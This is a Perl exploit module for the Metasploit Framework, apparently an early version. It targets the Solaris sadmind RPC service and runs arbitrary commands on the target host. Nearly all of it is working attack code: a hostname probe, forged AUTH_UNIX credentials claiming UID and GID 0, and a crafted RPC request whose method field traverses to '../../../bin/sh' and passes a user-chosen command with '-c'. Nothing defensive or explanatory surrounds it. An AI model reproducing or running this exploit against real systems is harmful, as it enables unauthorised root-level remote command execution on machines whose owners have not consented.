package Msf::Exploit::solaris_sadmind_exec;
use base "Msf::Exploit";
use strict;

my $advanced = {};

my $info = {
    'Name'    => 'Solaris sadmind Command Execution',
    'Version'  => '$Revision: 1.23 $',
    'Authors'  => ['H D Moore <hdm [at] metasploit.com> [Artistic License]',
                  'Brian Caswell <bmc [at] snort.org> [Artistic License]'],
    'Arch'    => [],
    'OS'      => ['solaris'],
    'Priv'    => 1,
    'Keys'    => ['cmd'],
    'Payload' => {
        'Space'    => 512,
        'BadChars' => "\x00",
    },

    'UserOpts' => {
        'RHOST' => [1, 'ADDR', 'The target address'],
        'PPORT' => [0, 'PORT', 'The rpc portmapper port', 111],
        'SPORT' => [0, 'PORT', 'The sadmind target port'],
    },

    'Description' => qq{
        This exploit targets a weakness in the default security
        settings of the sadmind RPC application. This server is
        installed and enabled by default on most versions of the
        Solaris operating system.    
    },
    'Refs' =>
        [
        'http://www.osvdb.org/4585',
        'http://lists.insecure.org/lists/vulnwatch/2003/Jul-Sep/0115.html'
        ],
    'DefaultTarget' => 0,
    'Targets' => [["No Target Needed"]],
};

sub new {
    my $class = shift;
    my $self  =
      $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
    return ($self);
}

sub Check {
    my $self        = shift;
    my $target_host = $self->GetVar('RHOST');
    my $portmap     = $self->GetVar('PPORT') || 111;
    my $target_port = $self->GetVar('SPORT')
      || rpc_getport($target_host, $portmap, 100232, 10);

    if (!$target_port) {
        $self->PrintLine("[*] Error: Could not determine port used by sadmind");
        return;
    }

    # Use an invalid hostname to obtain the real hostname
    my $target_name = "METASPLOIT";
    my $s           = Msf::Socket->new();

    if (!$s->Udp($target_host, $target_port)) {
        $self->PrintLine("[*] Could not create socket to RPC service");
        return (0);
    }

    $s->Send(rpc_sadmin_exec($target_name, "true"));
    my $r = $s->Recv(-1, 5);

    if ($r && $r =~ m/Security exception on host (.*)\.  USER/) {
        $target_name = $1;
    } else {
        $self->PrintLine("[*] Could not obtain target hostname");
        return (0);
    }

    $self->PrintLine("[*] Testing sadmind service on '$target_name'");
    $s->Send(rpc_sadmin_exec($target_name, "true"));
    $r = $s->Recv(-1, 5);
    $s->Close();

    if ($r) {
        if ($r =~ m/Security exception on host (.*)\.  USER/) {
            $self->PrintLine(
                "[*] The server reports access denied for sadmind");
            return (0);
        } else {
            $self->PrintLine("[*] The server appears to be vulnerable");
            return (1);
        }
    }

    $self->PrintLine("[*] No response received from server");
    return (0);
}

sub Exploit {
    my $self        = shift;
    my $target_host = $self->GetVar('RHOST');
    my $portmap     = $self->GetVar('PPORT') || 111;
    my $target_port = $self->GetVar('SPORT')
      || rpc_getport($target_host, $portmap, 100232, 10);

    my $encodedPayload = $self->GetVar('EncodedPayload');

    if (!$target_port) {
        $self->PrintLine("[*] Error: Could not determine port used by sadmind");
        return;
    }

    $self->PrintLine("[*] Trying to obtain hostname of $target_host:$target_port");

    # Use an invalid hostname to obtain the real hostname
    my $target_name = "METASPLOIT";
    my $s           = Msf::Socket->new();

    if (!$s->Udp($target_host, $target_port)) { return }

    $s->Send(rpc_sadmin_exec($target_name, "true"));

    my $r = $s->Recv(-1, 5);
    $s->Close();

    if ($r && $r =~ m/Security exception on host (.*)\.  USER/) {
        $target_name = $1;
    } else {
        $self->PrintLine("[*] Could not obtain target hostname");
        return;
    }

    $self->PrintLine("[*] Using hostname of '$target_name'");

    $s = Msf::Socket->new();
    if (!$s->Udp($target_host, $target_port)) { return }

    $self->PrintLine("[*] Executing command " . $encodedPayload->RawPayload);

    $s->Send(rpc_sadmin_exec($target_name, $encodedPayload->RawPayload));
    sleep(3);
    return;
}

sub rpc_getport {
    my ($target_host, $target_port, $prog, $vers) = @_;

    my $s = Msf::Socket->new();
    $s->Udp($target_host, $target_port);

    my $portmap_req =

      pack(
        "N*", rand() * 0xffffffff,    # XID
        0,                            # CALL
        2,                            # RPC VERSION
        100000,                       # Program Number  (PORTMAP)
        2,                            # Program Version (2)
        3,                            # procedure (getport)
        0,                            # cred length
        0,                            # cred data
        0,                            # verification length
        0,                            # verification data
        $prog,                        # program we are requesting...
        $vers,                        # version we are looking for
        17,                           # protocol (udp)
        0                             # port (0)
    );

    $s->Send($portmap_req);

    my $r = $s->Recv(-1, 5);
    $s->Close();

    if (length($r) == 28) {
        my $prog_port = unpack("N", substr($r, 24, 4));
        return ($prog_port);
    }

    return undef;
}

sub rpc_sadmin_exec {
    my ($hostname, $command) = @_;

    my $rpc = pack(
        "NNNNNNN",
        rand() * 0xffffffff,    # XID
        0,                      # call
        2,                      # RPC Version
        100232,                 # Program Number  (SADMIND)
        10,                     # Program Version (10)
        1,                      # Procedure
        1,                      # Credentials (UNIX)
    );

    my $rpc_auth =

      # Time Stamp
      pack("N", time() + 20001) . encode_string($hostname) .

      # UID = 0, GID = 0, No Extra Groups  
      pack("NNN", 0, 0, 0);

    $rpc .= pack("N", length($rpc_auth)) . $rpc_auth . pack("NN", 0, 0);

    my $header = reverse(pack("V", time() + 20005))
      . "\x00\x07\x45\xdf\x00\x00\x00\x00\x00\x00\x00\x00"
      . "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
      . "\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00\x00"
      . "\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00"
      . "\x00\x00\x00\x04"
      . pack("N*", pack_ip("127.0.0.1"), 100232)
      . "\x00\x00\x00\x0a\x00\x00\x00\x04"
      . pack("N*", pack_ip("127.0.0.1"), 100232)
      . "\x00\x00\x00\x0a\x00\x00\x00\x11\x00\x00\x00\x1e"
      . "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
      . "\x00\x00\x00\x00"
      . encode_string($hostname)
      . encode_string("system")
      . encode_string("../../../bin/sh");  

    my $body = encode_string("ADM_FW_VERSION")
      . "\x00\x00\x00\x03"
      . "\x00\x00\x00\x04"
      . "\x00\x00\x00\x01"
      . "\x00\x00\x00\x00"
      . "\x00\x00\x00\x00"
      . encode_object("ADM_LANG", "C")
      . encode_object("ADM_REQUESTID",     "0810:1010101010:1")
      . encode_object("ADM_CLASS",         "system")
      . encode_object("ADM_CLASS_VERS",    "2.1")
      . encode_object("ADM_METHOD",        "../../../bin/sh")
      . encode_object("ADM_HOST",          $hostname)
      . encode_object("ADM_CLIENT_HOST",   $hostname)
      . encode_object("ADM_CLIENT_DOMAIN", "")
      . encode_object("ADM_TIMEOUT_PARMS", "TTL=0 PTO=20 PCNT=2 PDLY=30")
      . encode_object("ADM_FENCE")
      . encode_object("X", "-c")
      . encode_object("Y", $command)
      . encode_string("netmgt_endofargs");

    my $res =
      $rpc . $header
      . pack("N", (length($body) + 4 + length($header)) - 330) . $body;

    return ($res);
}

sub encode_string {
    my ($string) = @_;
    my $len = length($string);
    $string .= chr(hex(0)) x (4 - ($len % 4)) if ($len % 4);
    return (pack("N", $len) . $string);
}

sub weird_encode_string {
    my ($string) = @_;
    my $len = length($string);
    $string .= chr(hex(0)) x (4 - ($len % 4)) if ($len % 4);
    return (pack("N*", $len + 1, $len) . $string);
}

sub encode_object {
    my ($name, $value) = @_;
    if (defined($value)) {
        if (length($value) == 0) {
            return encode_string($name) . pack("N*", 9, 1, 0, 0, 0);
        } else {
            return encode_string($name)
              . pack("N", 9)
              . weird_encode_string($value)
              . pack("NN", 0, 0);
        }
    } else {
        return encode_string($name) . pack("N*", 9, 0, 0, 0);
    }
}

sub pack_ip {
    my ($ddip) = @_;
    my @bytelist = split /\./, $ddip;
    my $packedip =
      $bytelist[3] + ($bytelist[2] * 256) + ($bytelist[1] * 65536) +
      ($bytelist[0] * 16777216);
    return ($packedip);
}


